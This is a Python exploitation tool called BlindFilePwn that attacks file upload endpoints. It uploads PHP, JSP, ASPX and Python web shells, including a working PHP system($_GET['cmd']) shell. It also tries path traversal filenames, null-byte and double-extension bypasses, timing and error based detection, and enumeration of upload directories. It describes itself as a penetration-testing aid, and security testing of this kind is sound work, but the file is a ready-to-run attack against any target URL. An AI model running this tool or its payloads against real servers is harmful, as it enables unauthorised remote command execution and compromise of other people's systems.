#!/usr/bin/env python3
"""
BlindFilePwn - Blind File Upload Vulnerability Exploitation Tool
Designed for penetration testing and security research
Supports multiple exploitation techniques for blind file upload vulnerabilities
"""

import requests
import sys
import time
import argparse
import os
import mimetypes
from urllib.parse import urlparse, urljoin
from datetime import datetime
from pathlib import Path
import random
import string

class BlindFileUploadExploit:
    """Main exploitation class for blind file upload vulnerabilities"""
    
    def __init__(self, target_url, timeout=10, verbose=False):
        self.target_url = target_url
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        self.session.timeout = timeout
        self.results = []
        
    def log(self, message, level="INFO"):
        """Logging function"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
        
    def log_verbose(self, message):
        """Verbose logging"""
        if self.verbose:
            self.log(message, "DEBUG")
            
    def generate_filename(self, extension="txt"):
        """Generate unique filename for testing"""
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        timestamp = int(time.time() * 1000)
        return f"blindtest_{random_str}_{timestamp}.{extension}"
    
    def test_basic_upload(self, upload_endpoint, param_name="file"):
        """Test basic file upload vulnerability"""
        self.log("Testing basic file upload vulnerability...")
        
        try:
            filename = self.generate_filename("txt")
            payload = f"BlindFile Upload Test - {datetime.now()}"
            files = {param_name: (filename, payload, "text/plain")}
            
            response = self.session.post(
                urljoin(self.target_url, upload_endpoint),
                files=files,
                allow_redirects=True
            )
            
            self.log_verbose(f"Response status: {response.status_code}")
            self.log_verbose(f"Response length: {len(response.content)}")
            
            if response.status_code == 200:
                self.log("+ Upload endpoint responds with 200 OK", "SUCCESS")
                self.results.append({"type": "basic_upload", "status": "Success", "filename": filename})
                return True
            else:
                self.log(f"- Unexpected status code: {response.status_code}", "WARNING")
                return False
                
        except Exception as e:
            self.log(f"- Error during basic upload test: {str(e)}", "ERROR")
            return False
    
    def test_webshell_upload(self, upload_endpoint, param_name="file"):
        """Test uploading web shell (PHP, JSP, ASP, etc.)"""
        self.log("Testing web shell upload capabilities...")
        
        shells = {
            "php": '<?php system($_GET["cmd"]); ?>',
            "jsp": '<% out.println(request.getParameter("cmd")); %>',
            "aspx": '<script runat="server"><%Response.Write(System.Diagnostics.Process.GetCurrentProcess().ProcessName);%></script>',
            "py": 'import os; os.system(__import__("sys").argv[1])',
        }
        
        for shell_type, shell_code in shells.items():
            try:
                filename = self.generate_filename(shell_type)
                files = {param_name: (filename, shell_code, "text/plain")}
                
                response = self.session.post(
                    urljoin(self.target_url, upload_endpoint),
                    files=files,
                    allow_redirects=True
                )
                
                if response.status_code == 200:
                    self.log(f"+ {shell_type.upper()} shell uploaded: {filename}", "SUCCESS")
                    self.results.append({
                        "type": "webshell",
                        "shell_type": shell_type,
                        "filename": filename,
                        "status": "Uploaded"
                    })
                    
            except Exception as e:
                self.log_verbose(f"Error uploading {shell_type} shell: {str(e)}")
    
    def test_path_traversal(self, upload_endpoint, param_name="file"):
        """Test path traversal in blind uploads"""
        self.log("Testing path traversal techniques...")
        
        traversal_paths = [
            "../shell.php",
            "../../shell.php",
            "../../../shell.php",
            "....//shell.php",
            "..\\..\\shell.php",
            "%2e%2e/shell.php",
            "..%252fshell.php",
        ]
        
        shell_payload = '<?php system($_GET["cmd"]); ?>'
        
        for path in traversal_paths:
            try:
                files = {param_name: (path, shell_payload, "text/plain")}
                response = self.session.post(
                    urljoin(self.target_url, upload_endpoint),
                    files=files,
                    allow_redirects=True
                )
                
                if response.status_code == 200:
                    self.log(f"+ Path traversal accepted: {path}", "SUCCESS")
                    self.results.append({
                        "type": "path_traversal",
                        "path": path,
                        "status": "Success"
                    })
                    
            except Exception as e:
                self.log_verbose(f"Error testing path: {path}")
    
    def test_null_byte_injection(self, upload_endpoint, param_name="file"):
        """Test null byte injection in filenames"""
        self.log("Testing null byte injection...")
        
        filename = f"shell.php%00.txt"
        payload = '<?php system($_GET["cmd"]); ?>'
        
        try:
            files = {param_name: (filename, payload, "text/plain")}
            response = self.session.post(
                urljoin(self.target_url, upload_endpoint),
                files=files,
                allow_redirects=True
            )
            
            if response.status_code == 200:
                self.log(f"+ Null byte injection accepted: {filename}", "SUCCESS")
                self.results.append({
                    "type": "null_byte",
                    "filename": filename,
                    "status": "Success"
                })
                
        except Exception as e:
            self.log_verbose(f"Error testing null byte: {str(e)}")
    
    def test_double_extension(self, upload_endpoint, param_name="file"):
        """Test double extension bypass"""
        self.log("Testing double extension bypass...")
        
        extensions = [
            "shell.php.txt",
            "shell.php.jpg",
            "shell.php.png",
            "shell.jpg.php",
            "shell.txt.php",
            "shell.phtml",
            "shell.shtml",
            "shell.pht",
        ]
        
        payload = '<?php system($_GET["cmd"]); ?>'
        
        for ext in extensions:
            try:
                files = {param_name: (ext, payload, "text/plain")}
                response = self.session.post(
                    urljoin(self.target_url, upload_endpoint),
                    files=files,
                    allow_redirects=True
                )
                
                if response.status_code == 200:
                    self.log(f"+ Double extension accepted: {ext}", "SUCCESS")
                    self.results.append({
                        "type": "double_extension",
                        "filename": ext,
                        "status": "Success"
                    })
                    
            except Exception as e:
                self.log_verbose(f"Error testing extension: {ext}")
    
    def test_timing_based_detection(self, upload_endpoint, param_name="file"):
        """Test timing-based blind upload detection"""
        self.log("Testing timing-based detection...")
        
        try:
            filename = self.generate_filename("txt")
            payload = "test"
            files = {param_name: (filename, payload, "text/plain")}
            
            start_time = time.time()
            response = self.session.post(
                urljoin(self.target_url, upload_endpoint),
                files=files,
                allow_redirects=True
            )
            normal_response_time = time.time() - start_time
            
            self.log(f"Normal upload response time: {normal_response_time:.3f}s", "INFO")
            
            large_payload = "x" * (5 * 1024 * 1024)
            files = {param_name: (self.generate_filename("txt"), large_payload, "text/plain")}
            
            start_time = time.time()
            try:
                response = self.session.post(
                    urljoin(self.target_url, upload_endpoint),
                    files=files,
                    allow_redirects=True,
                    stream=True
                )
                large_response_time = time.time() - start_time
                self.log(f"Large upload response time: {large_response_time:.3f}s", "INFO")
                
                if large_response_time > normal_response_time * 2:
                    self.log("+ Timing difference detected - file likely processed", "SUCCESS")
                    self.results.append({
                        "type": "timing_based",
                        "normal_time": f"{normal_response_time:.3f}s",
                        "large_time": f"{large_response_time:.3f}s",
                        "status": "Detectable"
                    })
            except requests.exceptions.Timeout:
                self.log("+ Large upload timeout detected - file likely processed", "SUCCESS")
                
        except Exception as e:
            self.log_verbose(f"Error in timing test: {str(e)}")
    
    def test_error_based_detection(self, upload_endpoint, param_name="file"):
        """Test error-based blind upload detection"""
        self.log("Testing error-based detection...")
        
        test_cases = [
            ("valid.txt", "valid content", "Valid upload"),
            ("", "", "Empty filename"),
            ("shell.php", '<?php system("id"); ?>', "PHP shell"),
            ("../../etc/passwd", "traversal attempt", "Path traversal"),
        ]
        
        for filename, content, description in test_cases:
            try:
                files = {param_name: (filename, content, "text/plain")}
                response = self.session.post(
                    urljoin(self.target_url, upload_endpoint),
                    files=files,
                    allow_redirects=True
                )
                
                if response.status_code != 200:
                    self.log(f"+ Error response for {description}: {response.status_code}", "SUCCESS")
                    
                    if "error" in response.text.lower() or "invalid" in response.text.lower():
                        self.log(f"  Error message returned: {response.text[:100]}", "INFO")
                    
            except Exception as e:
                self.log_verbose(f"Error in test case '{description}': {str(e)}")
    
    def probe_common_upload_paths(self):
        """Probe common upload directory paths"""
        self.log("Probing common upload paths...")
        
        common_paths = [
            "/upload",
            "/uploads",
            "/files",
            "/media",
            "/images",
            "/images/upload",
            "/user_files",
            "/documents",
            "/assets",
            "/tmp",
            "/public/uploads",
            "/var/www/uploads",
            "/storage",
            "/data",
        ]
        
        found_paths = []
        
        for path in common_paths:
            try:
                response = self.session.head(
                    urljoin(self.target_url, path),
                    allow_redirects=True
                )
                
                if response.status_code in [200, 301, 302, 403]:
                    self.log(f"+ Path found: {path} (Status: {response.status_code})", "SUCCESS")
                    found_paths.append(path)
                    
            except Exception as e:
                self.log_verbose(f"Error probing {path}: {str(e)}")
        
        return found_paths
    
    def run_full_scan(self, upload_endpoint="/upload", param_name="file"):
        """Run complete exploitation scan"""
        self.log("="*60, "INFO")
        self.log("BlindFilePwn - Full Vulnerability Scan", "INFO")
        self.log(f"Target: {self.target_url}", "INFO")
        self.log("="*60, "INFO")
        
        try:
            self.log("Testing target connectivity...")
            response = self.session.head(self.target_url, allow_redirects=True)
            self.log(f"+ Target is reachable (Status: {response.status_code})", "SUCCESS")
        except Exception as e:
            self.log(f"- Cannot reach target: {str(e)}", "ERROR")
            return False
        
        self.test_basic_upload(upload_endpoint, param_name)
        self.test_webshell_upload(upload_endpoint, param_name)
        self.test_path_traversal(upload_endpoint, param_name)
        self.test_null_byte_injection(upload_endpoint, param_name)
        self.test_double_extension(upload_endpoint, param_name)
        self.test_timing_based_detection(upload_endpoint, param_name)
        self.test_error_based_detection(upload_endpoint, param_name)
        
        self.log("\n" + "="*60, "INFO")
        found_paths = self.probe_common_upload_paths()
        
        self.log("\n" + "="*60, "INFO")
        self.log("SCAN COMPLETE - SUMMARY", "INFO")
        self.log("="*60, "INFO")
        self.log(f"Total tests performed: {len(self.results)}", "INFO")
        self.log(f"Successful uploads/detections: {sum(1 for r in self.results if r['status'] in ['Success', 'Uploaded', 'Detectable'])}", "INFO")
        
        if self.results:
            self.log("\nVulnerabilities Found:", "INFO")
            for idx, result in enumerate(self.results, 1):
                self.log(f"  {idx}. {result}", "INFO")
        
        return len(self.results) > 0
    
    def generate_report(self, output_file="blind_file_report.txt"):
        """Generate detailed report"""
        self.log(f"Generating report: {output_file}", "INFO")
        
        with open(output_file, 'w') as f:
            f.write("="*70 + "\n")
            f.write("BlindFilePwn - Exploitation Report\n")
            f.write("="*70 + "\n\n")
            f.write(f"Target: {self.target_url}\n")
            f.write(f"Scan Date: {datetime.now()}\n")
            f.write(f"Total Results: {len(self.results)}\n\n")
            
            if self.results:
                f.write("FINDINGS:\n")
                f.write("-"*70 + "\n")
                for result in self.results:
                    for key, value in result.items():
                        f.write(f"  {key}: {value}\n")
                    f.write("\n")
            else:
                f.write("No vulnerabilities detected.\n")
            
            f.write("\n" + "="*70 + "\n")
        
        self.log(f"+ Report saved to {output_file}", "SUCCESS")


def main():
    parser = argparse.ArgumentParser(
        description='BlindFilePwn - Blind File Upload Vulnerability Exploitation Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
EXAMPLES:
  python blindfilepwn.py -u http://target.com -e /upload
  python blindfilepwn.py -u http://target.com -e /api/upload -p uploadfile -v
  python blindfilepwn.py -u http://target.com -e /upload --report

SUPPORTED EXPLOITATION TECHNIQUES:
  - Basic file upload detection
  - Web shell uploads (PHP, JSP, ASPX, Python)
  - Path traversal bypass
  - Null byte injection
  - Double extension bypass
  - Timing-based detection
  - Error-based detection
  - Common upload path enumeration
        '''
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://target.com)')
    parser.add_argument('-e', '--endpoint', default='/upload', help='Upload endpoint (default: /upload)')
    parser.add_argument('-p', '--param', default='file', help='File parameter name (default: file)')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--report', action='store_true', help='Generate detailed report')
    
    args = parser.parse_args()
    
    try:
        exploit = BlindFileUploadExploit(args.url, timeout=args.timeout, verbose=args.verbose)
        success = exploit.run_full_scan(upload_endpoint=args.endpoint, param_name=args.param)
        
        if args.report:
            exploit.generate_report()
        
        sys.exit(0 if success else 1)
        
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
